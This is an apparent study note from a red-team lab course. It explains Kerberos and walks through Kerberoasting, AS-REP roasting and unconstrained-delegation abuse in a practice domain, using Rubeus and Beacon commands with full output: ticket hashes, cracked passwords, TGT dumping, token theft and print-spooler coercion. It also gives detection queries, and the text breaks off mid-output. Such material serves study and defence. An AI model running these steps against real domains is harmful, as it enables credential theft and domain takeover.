---
description: 09/17/2025
---

# ✅ Kerberos

## What is Kerberos?

This is a network authentication protocol that provides strong, ticket-based authentication for clients and services over a non-trusted network.

Essentially, it prevents password sharing and enabled Single Sign-On (SSO).

### What encryption does it use?

It relies on a symmetric-key cryptography and a trusted third party, known as the Key Distribution Center (KDC) in order to issue encrypted tickets that allow users to access services without having to re-authenticate.&#x20;

## Brief Overview

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="305"><figcaption></figcaption></figure>

{% hint style="info" %}
:fingers\_crossed:Kerberos is a very fun topic that can be invaluable knowledge to an attacker. It contains some awesome abuse primitives that are well known within Active Directory environments.
{% endhint %}

When a user logs onto their workstation, <mark style="color:yellow;">their machine will send an</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`AS-REQ`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">message to the KDC</mark> (Domain Controller), <mark style="color:yellow;">requesting a</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`TGT`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">using a secret key that is derived from the user's password</mark>.

The KDC _<mark style="color:green;">**verifies**</mark>_ the **secret key** with the password it has stored in Active Directory for that user. _**Once validated**_, <mark style="color:yellow;">it returns the TGT in an</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`AS-REP`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">message</mark>. <mark style="color:green;">The TGT contains the user's identity and is encrypted with the KDC secret key (the</mark> <mark style="color:green;"></mark><mark style="color:green;">`krbtgt`</mark> <mark style="color:green;"></mark><mark style="color:green;">account)</mark>.

_**When the user attempts to access a resource backed by Kerberos authentication**_ (e.g. a file share), <mark style="color:green;">their machine looks up the associated Service Principal Name</mark> (SPN — pronounced SPIN). <mark style="color:green;">It then requests (</mark><mark style="color:green;">`TGS-REQ`</mark><mark style="color:green;">) a Ticket Granting Service Ticket (TGS) for that service from the KDC (DC)</mark>, and <mark style="color:green;">presents its TGT as a means of proving they're a valid user</mark>.

Lastly, the KDC will return a TGS (`TGS-REP`) for the service in question to the user, which is then presented to the service.

The <mark style="color:yellow;">service will inspect the TGS and decides whether it should grant the user access or not</mark>.

## Kerberoasting

### Services (Local and Domain Accounts)

_**Services run on a machine under the context of a user account**_. <mark style="color:yellow;">These accounts are either local to the machine</mark> (**`LocalSystem`, `LocalService`, `NetworkService`**) <mark style="color:yellow;">or are domain accounts</mark> (e.g. **`DOMAIN\mssql`**).

### SPNs

A _<mark style="color:yellow;">**Service Principal Name**</mark>_ (SPN) is a <mark style="color:green;">unique identifier to a service instance</mark>.

SPNs are used with Kerberos to associate a service instance with a logon account, and are configured on the User Object in AD.

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Part of the TGS returned by the KDC (DC) is encrypted along with a _**secret**_ derived from the password of the user account running that service.&#x20;

### What is Kerberoasting?

It is a _<mark style="color:green;">technique that requests TGS' for services running under the context of domain accounts, obtaining hashes, and taking them offline to reveal their plaintext passwords</mark>_.

<mark style="color:yellow;">`rubeus`</mark>' <mark style="color:yellow;">`kerberoast`</mark> parameter _**can be used to perform the kerberoasting technique**_.

_<mark style="color:yellow;">**Running it without further arguments will roast every account within the domain that has a SPN**</mark>_ (excluding `krbtgt`):

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /simple /nowrap

[*] Total kerberoastable users : 3

$krb5tgs$23$*mssql_svc$dev.cyberbotic.io$MSSQLSvc/sql-2.dev.cyberbotic.io:1433@dev.cyberbotic.io*$122A4848378D3CFFEF922BDEAAC3707A$8FE7692C9C318EC7B4630C929AD54F87784B9E52293020E17BB427BD3FD27BA3C491D264BE8082505F3A2C40142703042A7EC3E161828A89003A0FC7C8CC55111FA432C0F0F2ED3488711E3F845CABFAC9141D63D69397741752201561C02DAEB131C1E079CDE112C9203E91B6A55714261AD223DF2B6879C5DF3805362068DFE39EF51C88E35C45ACE05DF4503252478E9AFD69FA21192046C4E3D8ECA7801D460C4C7D6AF7026AA3A2235A584DA1CA29C16AB7BDF9B307F3EBE6DCA84B9ABEE66ABA070613293DD91EB89B33B6633EB3EB906350C9AED9AD03EE306743024C09AA9AE26582460164BC3160FE95284F33174B3263EEA22E270F9A2D274390BA4546C110E44D7A678F8E286FCBAC660FBF8A0F7CBD72F1FA71BE7F59661CD75847FB7882F8481DC3ABB665CBA7BAAB0600D1E11131E4FB1C0690FCB20D707D2B7906E38381116FCEB8E5F9DAA882A95A4F3D04CB890C6C24EA997361881AFE3003828F759E96AAFC23EB589EC778352C9C5E0109BE110E01A12AB8D15383BA0714EC68B9A666CA42488B3438B1D52517F6A0F94CA8A1A2B93D12B815C32E721F71DC1D5C34ED4D7E5FB11E8AA1E9CB0CDE6BC997E6DB5A3A29EE329337243488A1902F0F66271DF224080A6FED34313A9253F523766F6EB6523E661E425E98302596B4649FE97D566534CE6DAAB323C5118163D160D1747AE3776FFBECA7A7F4E7FAB55833268D529A16DE926F3B86854F4D662306462BDBBBC55421D8AA3C059D981A168C25663A676401A86F8AA9CC9F6A71B7C2C0B8500D78683B2FD39C74F228F83F4D9C1AFB051E91C5A59278B010B1DAA05DB799B170BD3422B74FBE068CB5BF980037A4B907DF8930379A79BFCEBF54B8AF22E22565EDE399A18FAFBC4F09ADF82C4446FAC2169174CBADD49518C286A67B320AF445AD12892497F2D0152C92145463CAD6C99AA5F331FBEE04BCD05CFE1D40C3DFFC3C1140743C1A31A814EEEE5199365AB332EA1F681D62D7B3FE2C0C2F02005B63482F110FF43B9BF1C743F0E4ECC62AEC2914C6A5965CC18F13DBF40959F6E7AD9893FC046D2E5B60F1415F83D522A2B7F0A0B32FC5E5F514165F4B0D2B661162550CE578B43653AF471FA119EAD12DA26FE778362458AAF58E94413B2814A0A1A215118BFD6B0F3BCC4B9AC9D28D51E1279F719D7E0B0CB33824E778CA77F92E0E3A28FAE76A107920734B2D9D81F4E35EBFA3C37E84EBD0CB72C2507CB2627ED3AA8CE32647CFADC288967BFA12F21C3F3A2FBDF6AC64A8743853337D086338ED0AAE6AB3594B78B2926E9DC02DE962D41B9146E0F7718E1C7EA2CB334C40B43C1294C88C68B17A813AD0C15AA8238FF81DB14EB5AB56C7E6ABE56CD0BB9FA02761E1838D0FC894F7E5B627AC959FFB6DE2E235830A5FAEE8D58FDC3098EC20E64D56323CC8C47987AA5B85E6CB165F36B5A6AE9499F6593E13B81F501D7430BFBADF7B03EFD1F65869F801AE78A22165D862132194B96A68ECA2F55BE3338346FBAF836C4D61AF9F7FC012C5F14B220C62349A130E6F4C8A1620866A370C2A433AE36C08E2E496CC833824C0873C5B5D7A8DA38A2C41CC89ADEA62F22B3CB47445D60116BE97EE96AC85C6F7E087AAC4C2
$krb5tgs$23$*squid_svc$dev.cyberbotic.io$HTTP/squid.dev.cyberbotic.io@dev.cyberbotic.io*$F819F7E05FCE5C6861D65E38E65ADF6C$A17248D5456E6A9641F60D9B4EB6AFA69373DFF265153E4E4663E4D01613D496D5AA45D14A5FD672412B25998342DA1D7894066CD47BF8B5C0805807E744937AC60B4AD19067C1D900B7A2ED4493EC6B77AE8FBC5F20DFF1D47BCB1F259C72FEA4219A1AAAE1BB1776491F364B1B5BA69D72015EEEFDB57F688D508DCE63312C5407D2E6347B6D30528ACC4464837DAE6820E0F27CCBA7A36B89B8BA5F782B48FFAEDB349D79571B58F7303579627E493B101F90613CDA0013FF27DD558E7E81CCF82B2953AEF650D8DFEAAAF427CD981CB85D57FCABCEA551303B1EE3AED2B542372599FC2C92A0CCDE8482D3B4344EA8DC7B0AEEBD0D24B5F79996E9BC758C28FCE9491D97B9CBEC80D28D8043E1B761703D20A6CAAF04255C082AC64392C4B6C8FF32585605342E07622DE9C2CDAF21BFFB7FEAB1FF19C2AD5D89340CC51D5B5AE50F702E2E45FA01C26DB5086E1FBBC67133F522BFC4A18D77630DAA174633E0E4DFF59737171606BB74C96C8B109AE5DB2BF49F464274D65FF3740B2EB8AE378AEB7E20D7607C785939673E2E8166DA88A274EA247388E6A18EF4B67600F0092F70BDAF0FF440D7C244A520A8CF0A6482CE837C6A927026DF6C0C27228C3039192D8B2B260C45C831609F89ED5B88D364E7327520850FD72072591B938E3412FBFF71FDB32B8A99117377C7B23783564CFD414FA114E45B497C90CEED124F9B291FBE422F824D86F426C0D6616AF4A9EADD21D7EE7370B9AFD1DBE66709D7D7963FF626BB9849C12A2252166BD586A67961935C761F42A03E8CEDB84435546474FAFB951DA4AA878A64C9EADD10962756B2455BBF7AA844FA17A5D158D27B6926FAFF930103861D229C4E15F1CDF7856AF55382F8054E3E00853BF924AEC68EAFD2786849FDE0E0B7D19DEA51029D1240BF832EB5C55D862FBE769A7A2D3F83475A46F80679B7E35FD58A0E6E4848E2CA1C82A6ECA2AC01201BB71F659987B7AB45B74A9CA524022752F6392199951B5B8AC032B8774989051B7FE21A9A9B207D50FC83D1337E31D1F5AF969174E78BC0C50496552E8CA6DCC681D88C59D199D594C4648C75D8FA6D5EFB9876E5E32088560DAD793BDF80A20389AB7E6444AA301736FA89F1EB622D590C8381FD6B97579525EBD4933B3768399A3480C42AE0F768F643528DDCC5A679156AADE780DB37CA61CF3AFAEE2ECF8996122C7C4A8A679C3DC99A1428801AED1D7C91574D6A50A79325FDC7C58FA85FE410D4F311451387C69691B0B37A0CCF890F8F725286C0AD28DB6294A8DC04346AC0167FAC80E4C041C31D2BDFCF948F4A82D843D4A928F3244868084C853B8E73B166E3C25F7E043F9A833CDF939476913E1D0795B10BB8709A11E41D1A20096E41F13F7703540F713F4EDD73D3B5EAAE904EE1305D960047DD6A27ADD3E06204403A76364369DD7395E84BE660147FD4893904B4B0F01355D0961D65D1BAAA97DC7EDD3321D8E6AE13EED9F070DEC8D4C70C3F67AEC23084CF6526252EA23B979463B8BE53CFC81909E6FA50D59A73878275F79BCB484BDB60BD3C1A9EAEA4EF613D7995BF5DB9E0C1D7D222D138C65C20155CD17697E6014F608BC78993EF2F8BDE339532C2F5587981579C7FBB
$krb5tgs$23$*honey_svc$dev.cyberbotic.io$HoneySvc/fake.dev.cyberbotic.io@dev.cyberbotic.io*$B6424DAD1372B0E769F64D78848770BA$C2DE3B1FE0FA17EA680043183615A9280A6DAFB5A6A2FA43D6077E4542EACEBBCE2C8D299F1827A94AC9768D5211127A5734586FCD8FD929B12D64C1D72E8ADD2B0A051E8F21EBA9E6631CA775B287E6CA6071550AB27EE950A58B85E80B0C19B63537DC086BE7B44AFF685B232DED804645A7E2DC2A7967E6B7E44BFCAA67CCFEDD74EF1FFC73D7006FAD32B281EF1AF78650757C30BE64394475113176117C050766D5C8B8B3FA8D7226038AD0FF498FFA609B320233FC27C2772C3B92C9259DCDA26C069A5B1BFA14037D8E65F85F02BE1FA3AE567A1C6E6EFC9464E5B313B78588D9B6776701C67D3A514DC5A133B422C624224632FFCD50A5C20B7AAA7B04D692EA64E33A2B3A39B3F0DE58EEC4E3C9D14AB870797325D773CD477B3D498FB82CB8BC06FF4E1DC954465E9077642F050C59E296C05E8F4674F3411739E9C4CF0DF88E6CD68EF32B1D820379F6256CE5EE9EE10177F56BE9E364A59C9EFE3B07D6798EB8373D8EC5367D7C7DD402742264DEAEA939404CBA1673AAB05B6BC56C5FA9CDA7B67A0E330DF7C2E440713FF4F129B8E4A3E5F2A9294BD45BD0E9DBEC63377E87551C374D8D7FF19376A1ADABEBC579D9C607CA7FC8198598BC36D0F4DC799FA89EFABCACDB5AB4BD3498A212C59D3DF93FE008F5B71889633158A942411189496D4958812A71EA344B2F65F6CF5F94F99D12C84F56F25B92489D148C140ACC8D40D5DEC2C6C5B4892060D6806186A38E72CB9183B7391C3FAD8D104B0675C83F568608DA966D172B8588441F0838A5F6EFD354EEF6448F41DABB904A2FA724439B3AC96E035A35CCA9C993B5545A1771D11BE4F82CE1D58CEFFACF889099A81349DFE45D2C73CED9B85550D3C7B1B6624D9C5639DBBEA0B45F3990A5CFDC8B3DF697E12FB7800779575FB897761F0674B89A8D713EF0F744A64C824DAE6269C5BEE1A85F2434E2E8CC283F42C697EF1A74C7C522002301D4CB929A3E715BAF939978F9DD792005CFFA6FAB35D536C4092AA621D7CBC9B3302281BC66B904FA1C5687C981276D59409E794806BE340976D0DD5198E631B9D76BF57AFFB8C4D1F3913F3549A99E90D85CA58AE2C2838F4BB5093BA0F7CDC37F7D1281FB60929B3F9B0473AEE8F7AD4BCE08B1375F2222903F2C860F04D26DAF9D06A0E5E6A3312046A54C1E4DE57EBA411879DFA4420BA4AC854CA8830A56C4F7AA5D4082E16FFA99D297E58837C872D6B8AA0D38FD12EB70AB31FCDF104705DD26E5A38AE58B5633955ED4830E7590CA4C067C31C05861B2AF9EC3C408E2BF0256896B4242926B8A1A7D0221E93355AF0E64861A44CEE50DE6A65F6A767646F7961BC0866B4107BEFC6CD0AA3E682528E74B848A41A21293FD1CD222304FD2142F12BB85511B72FD22E82B94DA21D3B4AD098B016D9D5181E446CA8FD7D98F4784BEE65BD648074ABAB39849B784BF362EFACE9B210C8ECF550BFD7A74C207D4A05C9AD0FD4DCDCB135F421ADF69AEBF21DDA3716079E80B7A039C77DA8802A8D5463652ACD401E1DA06D4FBC4519AA657D19AE808C59693B45AA29328F2061183193A1D14F77A866B7E9AC8C381E5E9BE8BB621E05E71B5C6489B9BE105838415555FDAB70B71D2A7E750B8
```

{% hint style="info" %}
&#x20; :bulb:

**Even though `Rubeus` does not include the `krbtgt` account, it can** [_**sometimes**_](https://twitter.com/_wald0/status/1361720293539139589) **be cracked.**
{% endhint %}

### Cracking Hashes

These hashes can be cracked offline to recover the plaintext passwords for the accounts.

Use the <mark style="color:yellow;">`format=krb5tgs --wordlist=wordlist hashes`</mark> for _<mark style="color:green;">**john**</mark>_ or <mark style="color:yellow;">`-a 0 -m 13100 hashes wordlist`</mark> for _<mark style="color:green;">**hashcat**</mark>_.

```
$ john --format=krb5tgs --wordlist=wordlist mssql_svc
Cyberb0tic       (mssql_svc$dev.cyberbotic.io)
```

{% hint style="warning" %}
I experienced some hash format incompatibility with john.  Removing the `SPN` so it became: `$krb5tgs$23$*mssql_svc$dev.cyberbotic.io*$6A9E[blah]` seemed to address the issue.
{% endhint %}

{% hint style="danger" %}
**OPSEC**\
\
By default, Rubeus will roast every account that has an SPN.  _<mark style="color:$danger;">**Honey Pot accounts**</mark>_ can be configured with a "fake" SPN, which will generate a `4769` event when roasted.  _<mark style="color:$danger;">**Since these events will never be generated for this service, it provides a high-fidelity indication of this attack.**</mark>_

```
event.code: 4769 and winlog.event_data.ServiceName: honey_svc
```
{% endhint %}

### "Safer" Approach

Enumerate possible candidates first and roast selectively.

1. **Use this** _<mark style="color:green;">**LDAP query**</mark>_<mark style="color:green;">**&#x20;**</mark><mark style="color:green;">**to find domain users who have a SPN configured**</mark>**:**

```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName

[*] TOTAL NUMBER OF SEARCH RESULTS: 4
	[+] cn                   : krbtgt
	[+] servicePrincipalName : kadmin/changepw
	[+] samaccountname       : krbtgt
	
	[+] cn                   : MS SQL Service
	[+] servicePrincipalName : MSSQLSvc/sql-2.dev.cyberbotic.io:1433
	[+] samaccountname       : mssql_svc
	
	[+] cn                   : Squid Proxy
	[+] servicePrincipalName : HTTP/squid.dev.cyberbotic.io
	[+] samaccountname       : squid_svc
	
	[+] cn                   : Honey Token
	[+] servicePrincipalName : HoneySvc/fake.dev.cyberbotic.io
	[+] samaccountname       : honey_svc
```

2. **We&#x20;**<mark style="color:green;">**can then roast an individual account using the**</mark>**&#x20;**<mark style="color:yellow;">**`/user`**</mark>**&#x20;**<mark style="color:green;">**parameter**</mark>**:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap

[*] SamAccountName         : mssql_svc
[*] DistinguishedName      : CN=MS SQL Service,CN=Users,DC=dev,DC=cyberbotic,DC=io
[*] ServicePrincipalName   : MSSQLSvc/sql-2.dev.cyberbotic.io:1433
[*] PwdLastSet             : 8/15/2022 7:46:43 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*mssql_svc$dev.cyberbotic.io$MSSQLSvc/sql-2.dev.cyberbotic.io:1433@dev.cyberbotic.io*$122A4848378D3CFFEF922BDEAAC3707A$8FE7692C9C318EC7B4630C929AD54F87784B9E52293020E17BB427BD3FD27BA3C491D264BE8082505F3A2C40142703042A7EC3E161828A89003A0FC7C8CC55111FA432C0F0F2ED3488711E3F845CABFAC9141D63D69397741752201561C02DAEB131C1E079CDE112C9203E91B6A55714261AD223DF2B6879C5DF3805362068DFE39EF51C88E35C45ACE05DF4503252478E9AFD69FA21192046C4E3D8ECA7801D460C4C7D6AF7026AA3A2235A584DA1CA29C16AB7BDF9B307F3EBE6DCA84B9ABEE66ABA070613293DD91EB89B33B6633EB3EB906350C9AED9AD03EE306743024C09AA9AE26582460164BC3160FE95284F33174B3263EEA22E270F9A2D274390BA4546C110E44D7A678F8E286FCBAC660FBF8A0F7CBD72F1FA71BE7F59661CD75847FB7882F8481DC3ABB665CBA7BAAB0600D1E11131E4FB1C0690FCB20D707D2B7906E38381116FCEB8E5F9DAA882A95A4F3D04CB890C6C24EA997361881AFE3003828F759E96AAFC23EB589EC778352C9C5E0109BE110E01A12AB8D15383BA0714EC68B9A666CA42488B3438B1D52517F6A0F94CA8A1A2B93D12B815C32E721F71DC1D5C34ED4D7E5FB11E8AA1E9CB0CDE6BC997E6DB5A3A29EE329337243488A1902F0F66271DF224080A6FED34313A9253F523766F6EB6523E661E425E98302596B4649FE97D566534CE6DAAB323C5118163D160D1747AE3776FFBECA7A7F4E7FAB55833268D529A16DE926F3B86854F4D662306462BDBBBC55421D8AA3C059D981A168C25663A676401A86F8AA9CC9F6A71B7C2C0B8500D78683B2FD39C74F228F83F4D9C1AFB051E91C5A59278B010B1DAA05DB799B170BD3422B74FBE068CB5BF980037A4B907DF8930379A79BFCEBF54B8AF22E22565EDE399A18FAFBC4F09ADF82C4446FAC2169174CBADD49518C286A67B320AF445AD12892497F2D0152C92145463CAD6C99AA5F331FBEE04BCD05CFE1D40C3DFFC3C1140743C1A31A814EEEE5199365AB332EA1F681D62D7B3FE2C0C2F02005B63482F110FF43B9BF1C743F0E4ECC62AEC2914C6A5965CC18F13DBF40959F6E7AD9893FC046D2E5B60F1415F83D522A2B7F0A0B32FC5E5F514165F4B0D2B661162550CE578B43653AF471FA119EAD12DA26FE778362458AAF58E94413B2814A0A1A215118BFD6B0F3BCC4B9AC9D28D51E1279F719D7E0B0CB33824E778CA77F92E0E3A28FAE76A107920734B2D9D81F4E35EBFA3C37E84EBD0CB72C2507CB2627ED3AA8CE32647CFADC288967BFA12F21C3F3A2FBDF6AC64A8743853337D086338ED0AAE6AB3594B78B2926E9DC02DE962D41B9146E0F7718E1C7EA2CB334C40B43C1294C88C68B17A813AD0C15AA8238FF81DB14EB5AB56C7E6ABE56CD0BB9FA02761E1838D0FC894F7E5B627AC959FFB6DE2E235830A5FAEE8D58FDC3098EC20E64D56323CC8C47987AA5B85E6CB165F36B5A6AE9499F6593E13B81F501D7430BFBADF7B03EFD1F65869F801AE78A22165D862132194B96A68ECA2F55BE3338346FBAF836C4D61AF9F7FC012C5F14B220C62349A130E6F4C8A1620866A370C2A433AE36C08E2E496CC833824C0873C5B5D7A8DA38A2C41CC89ADEA62F22B3CB47445D60116BE97EE96AC85C6F7E087AAC4C2
```

## ASREP Roasting

_<mark style="color:$danger;">**If a user does not have Kerberos pre-authentication enabled**</mark>_, <mark style="color:$danger;">an AS-REP can be requested for that user and part of the reply can be cracked offline to recover their plaintext password</mark>.

This configuration is enabled on the User Object and is often seen on accounts that are associated with Linux systems.

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**As with&#x20;**<mark style="color:yellow;">**kerberoasting**</mark>**, we don't want to&#x20;**<mark style="color:yellow;">**asreproast**</mark>**&#x20;every account in the domain:**

```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname

[*] TOTAL NUMBER OF SEARCH RESULTS: 1
	[+] cn                : Squid Proxy
	[+] distinguishedname : CN=Squid Proxy,CN=Users,DC=dev,DC=cyberbotic,DC=io
	[+] samaccountname    : squid_svc
```

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:squid_svc /nowrap

[*] SamAccountName         : squid_svc
[*] DistinguishedName      : CN=Squid Proxy,CN=Users,DC=dev,DC=cyberbotic,DC=io
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
[*] Building AS-REQ (w/o preauth) for: 'dev.cyberbotic.io\squid_svc'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$squid_svc@dev.cyberbotic.io:BEDE491E0C9B3E932F9B4DF274AB059B$0947A85824870A9EA0B2C832B30D8B99BDA99F9451E9EB14AA0D9566674B32A10BE4954E6FB15DED54462D4AAAAE28DFB08C83EF0608DA6EEB9A08DBC79C06099D2B366BA5402A0ED60545B92B17882557CBB0FC700309751C51AF33F25A3103FA67DAAD9AD2154FE4171FBEFBE725AA1311CE50EFB8B87FF1BBCF5E97C496E08BA3CC4CA4F59820C4C27251686658C9F7EE52B43ED5A969A02273510AC7CCFB5DFE61E7A9D72E10B81E7B3ACBFDA0F3F058791E9A87D990871961D3BD9AEB40B9D0A1260094B17DCB8114DDBB19B5C2031F2906E527F96F1AFA62D907570E39E047659532F1FA043371DDF8D7FB9A5E5369A889A7BC
```

### Cracking ASREP Roastable-Obtained Hashes

Use <mark style="color:yellow;">`--format=krb5asrep --wordlist=wordlist squid_svc`</mark> for _<mark style="color:green;">**john**</mark>_ or <mark style="color:yellow;">`-a 0 -m 18200 squid_svc wordlist`</mark> for _<mark style="color:green;">**hashcat**</mark>_.

```
$ john --format=krb5asrep --wordlist=wordlist squid_svc
Passw0rd!        ($krb5asrep$squid_svc@dev.cyberbotic.io)
```

{% hint style="danger" %}
**OPSEC**\
\
ASREPRoasting with will generate a `4768` event with `RC4` encryption and a preauth type of `0`.

```
event.code: 4768 and winlog.event_data.PreAuthType: 0 and winlog.event_data.TicketEncryptionType: 0x17
```
{% endhint %}

## Unconstrained Delegation

_This one is going to be difficult, be patient, and read carefully. You can do it!_

### What is Delegation?

<mark style="color:yellow;">Delegation allows a user or machine to act on behalf of another user to another service</mark>.&#x20;

#### Use Cases?

A common implementation of this is where a user authenticates to a front-end web application that serves a back-end database.

The front-end application needs to authenticate to the back-end database (using Kerberos) as the authenticated user.

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### What is Unconstrained Delegation?

_**We know how a user performs Kerberos authentication to the web server,****&#x20;**<mark style="color:yellow;">**but how can the web server authenticate to the DB and perform actions as the user**</mark>**?**_

The solution is _**Unconstrained Delegation**_.

* It was introduced in Windows 2000

_**When configured on a computer**_, <mark style="color:green;">the KDC includes a copy of the user's TGT inside the TGS</mark>. In this _**example**_, <mark style="color:yellow;">when the user accesses the Web Server, it extracts the user's TGT from the TGS and caches it in memory</mark>. <mark style="color:yellow;">When the web server needs to access the DB server on behalf of that user, it uses the user's TGT to request a TGS for the database service</mark>.

### Interesting Perspective

_**Unconstrained delegation**_ <mark style="color:green;">will cache the user's TGT regardless of which service is being accessed by the user</mark>.

_So_, <mark style="color:green;">if an admin accesses a file share or any other service on the machine that uses Kerberos, their TGT will be cached in memory</mark>.

This means that _<mark style="color:$danger;">**if we can compromise a machine with unconstrained delegation enabled**</mark>_, <mark style="color:green;">we can extract any TGTs from that machine's memory and use them to impersonate the users against other services in the domain</mark>.

**This&#x20;**_<mark style="color:yellow;">**query**</mark>_**&#x20;will&#x20;**<mark style="color:green;">**return all computers that are permitted for unconstrained delegation**</mark>**:**

```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname

[*] TOTAL NUMBER OF SEARCH RESULTS: 2
	[+] samaccountname : DC-2$
	[+] dnshostname    : dc-2.dev.cyberbotic.io
	
	[+] samaccountname : WEB$
	[+] dnshostname    : web.dev.cyberbotic.io
```

{% hint style="info" %}
:bulb:

Domain Controllers are _**always permitted**_ for unconstrained delegation.
{% endhint %}

### Compromise Techniques/Scenarios

{% hint style="info" %}
USE THIS COMMAND DURING OPS!&#x20;

<mark style="color:yellow;">`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage`</mark>.
{% endhint %}

If we compromise <mark style="color:yellow;">`WEB$`</mark> and wait or socially engineer a privileged user to interact with it, we can steal their cached TGT.

Interaction can be via any Kerberos service, so something as simple as <mark style="color:yellow;">`dir \\web\c$`</mark> is enough.

<mark style="color:yellow;">`rubeus`</mark> <mark style="color:yellow;">`triage`</mark> is _<mark style="color:green;">**capable of showing all tickets that are currently cached**</mark>_.

<figure><img src="../.gitbook/assets/image (302).png" alt=""><figcaption></figcaption></figure>

**TGTs can be identified by the&#x20;**<mark style="color:yellow;">**`krbtgt`**</mark>**&#x20;service:**

```
beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

 --------------------------------------------------------------------------------------------------------------- 
 | LUID     | UserName                  | Service                                       | EndTime              |
 --------------------------------------------------------------------------------------------------------------- 
 | 0x14794e | nlamb @ DEV.CYBERBOTIC.IO | krbtgt/DEV.CYBERBOTIC.IO                      | 10/4/2022 9:35:38 PM |
```

{% hint style="info" %}
There is a scheduled task running on `Workstation 1` as `nlamb` that will interact with `WEB$` _**every 5 minutes**_. <mark style="color:yellow;">If the ticket is not there, wait a minute or so and try again</mark>.
{% endhint %}

**We can simply&#x20;**<mark style="color:green;">**extract this TGT and leverage it via a new logon session**</mark>**:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x14794e /nowrap
	
doIFwj [...snip...] MuSU8=

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFwj[...]MuSU8=

[*] Using DEV\nlamb:FakePass

[*] Showing process : False
[*] Username        : nlamb
[*] Domain          : DEV
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 1540
[+] Ticket successfully imported!
[+] LUID            : 0x3206fb

beacon> steal_token 1540

beacon> ls \\dc-2.dev.cyberbotic.io\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2022 15:44:08   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     08/15/2022 16:09:55   inetpub
          dir     05/08/2021 08:20:24   PerfLogs
          dir     08/24/2022 10:51:51   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     09/05/2022 17:17:48   ProgramData
          dir     08/15/2022 15:23:23   Recovery
          dir     08/16/2022 12:37:38   Shares
          dir     09/05/2022 12:03:43   System Volume Information
          dir     08/15/2022 15:24:39   Users
          dir     09/05/2022 17:09:56   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 1kb      fil     08/15/2022 16:16:13   dc-2.dev.cyberbotic.io_sub-ca.req
 12kb     fil     09/05/2022 07:25:58   DumpStack.log
 12kb     fil     09/06/2022 09:04:41   DumpStack.log.tmp
 384mb    fil     09/06/2022 09:04:41   pagefile.sys
```

### Obtaining TGTs

_<mark style="color:green;">**We can also obtain TGTs for computer accounts by forcing them to authenticate remotely to this machine**</mark>_.

As mentioned in the NTLM Relaying module within the Pivoting chapter, several tools exist to further facilitate this. This time, we will force the DC to authenticate to the web server to steal its TGT.

#### Monitoring for TGTs

Think of the tool [Responder](https://www.kali.org/tools/responder/).

**We will utilize the&#x20;**<mark style="color:yellow;">**`rubeus`**</mark> <mark style="color:yellow;">**`monitor`**</mark>**&#x20;command:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap

[*] Action: TGT Monitoring
[*] Monitoring every 10 seconds for new TGTs
```

This drops into a _**loop**_ and will continuously monitor for and extract new TGTs as soon as they are cached and intercepted.&#x20;

{% hint style="success" %}
This is a superior strategy (think of "running responder in the background" during engagements, this is the same methodology) since we will not have to run tools manually because there's a chance that we will miss tickets!
{% endhint %}

**Next, run&#x20;**<mark style="color:yellow;">**`SharpSpoolTrigger`**</mark>**:**

```
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe dc-2.dev.cyberbotic.io web.dev.cyberbotic.io
```

**Where:**

* <mark style="color:yellow;">`DC-2`</mark> is the "_**target**_".
* <mark style="color:yellow;">`WEB`</mark> is the "_**listener**_".

`Rubeus` will then capture the ticket.

```
[*] 9/6/2022 2:44:52 PM UTC - Found new TGT:

